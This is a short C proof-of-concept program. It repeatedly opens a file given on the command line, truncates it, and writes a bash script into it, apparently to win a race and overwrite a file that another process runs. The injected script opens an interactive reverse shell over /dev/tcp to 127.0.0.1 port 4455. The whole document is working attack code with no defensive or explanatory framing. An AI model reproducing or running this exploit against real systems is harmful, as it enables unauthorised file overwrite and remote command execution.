#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>


int main(int argc, char **argv) {
    
    int res1 = -1;
    int total = 10000;
    while(total>0 && res1== -1){

        int fd = open(argv[1], O_RDWR|O_TRUNC);

        const char *poc = "#!/bin/bash\n/bin/bash -i >& /dev/tcp/127.0.0.1/4455 0>&1  &\n";
        int res = write(fd, poc, strlen(poc));
        res1 = res;
        total--;
    }
}
